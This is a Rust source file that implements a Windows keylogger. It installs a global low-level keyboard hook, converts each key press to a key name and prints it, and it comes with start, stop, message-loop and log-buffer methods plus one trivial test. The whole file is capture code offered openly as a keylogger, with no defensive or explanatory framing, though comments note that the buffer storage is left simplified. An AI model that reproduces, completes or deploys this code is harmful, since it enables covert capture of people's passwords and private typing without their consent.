use std::io;
use std::sync::{Arc, Mutex};
use std::collections::VecDeque;

#[cfg(target_os = "windows")]
use winapi::{
    shared::windef::HHOOK,
    um::{
        winuser::{
            SetWindowsHookExW, UnhookWindowsHookEx, CallNextHookEx,
            GetMessageW, HC_ACTION, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT,
            WM_KEYDOWN, WM_SYSKEYDOWN, GetKeyNameTextW, MapVirtualKeyW,
            MAPVK_VK_TO_VSC, GetKeyboardState, ToUnicode,
        },
    },
};

pub struct Keylogger {
    buffer: Arc<Mutex<VecDeque<String>>>,
    #[cfg(target_os = "windows")]
    hook_handle: Option<HHOOK>,
}

impl Keylogger {
    pub fn new() -> Self {
        Self {
            buffer: Arc::new(Mutex::new(VecDeque::new())),
            #[cfg(target_os = "windows")]
            hook_handle: None,
        }
    }
    
    #[cfg(target_os = "windows")]
    pub fn start(&mut self) -> io::Result<()> {
        use std::ptr::null_mut;
        use winapi::um::libloaderapi::GetModuleHandleW;
        
        unsafe {
            // Install low-level keyboard hook
            let hook = SetWindowsHookExW(
                WH_KEYBOARD_LL,
                Some(Self::keyboard_proc),
                GetModuleHandleW(null_mut()),
                0
            );
            
            if hook.is_null() {
                return Err(io::Error::last_os_error());
            }
            
            self.hook_handle = Some(hook);
        }
        
        Ok(())
    }
    
    #[cfg(target_os = "windows")]
    pub fn stop(&mut self) -> io::Result<()> {
        if let Some(hook) = self.hook_handle {
            unsafe {
                UnhookWindowsHookEx(hook);
            }
            self.hook_handle = None;
        }
        Ok(())
    }
    
    #[cfg(target_os = "windows")]
    unsafe extern "system" fn keyboard_proc(code: i32, wparam: usize, lparam: isize) -> isize {
        if code == HC_ACTION {
            if wparam == WM_KEYDOWN as usize || wparam == WM_SYSKEYDOWN as usize {
                let kb = *(lparam as *const KBDLLHOOKSTRUCT);
                let vk_code = kb.vkCode;
                
                // Convert virtual key to character
                let mut key_name = [0u16; 256];
                let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);
                let len = GetKeyNameTextW((scan_code << 16) as i32, key_name.as_mut_ptr(), 256);
                
                if len > 0 {
                    let key_str = String::from_utf16_lossy(&key_name[..len as usize]);
                    
                    // Log the keypress
                    // In real implementation, would access Keylogger instance buffer
                    // For now, simplified
                    println!("[KEY] {}", key_str);
                }
            }
        }
        
        CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam)
    }
    
    pub fn get_logs(&self) -> Vec<String> {
        let mut buffer = self.buffer.lock().unwrap();
        buffer.drain(..).collect()
    }
    
    pub fn clear_logs(&self) {
        let mut buffer = self.buffer.lock().unwrap();
        buffer.clear();
    }
    
    #[cfg(target_os = "windows")]
    pub fn run_message_loop(&self) {
        use winapi::um::winuser::{GetMessageW, TranslateMessage, DispatchMessageW};
        use std::mem;
        
        unsafe {
            let mut msg = mem::zeroed();
            while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
        }
    }
}

impl Drop for Keylogger {
    fn drop(&mut self) {
        #[cfg(target_os = "windows")]
        {
            let _ = self.stop();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_keylogger_creation() {
        let keylogger = Keylogger::new();
        assert_eq!(keylogger.get_logs().len(), 0);
    }
}
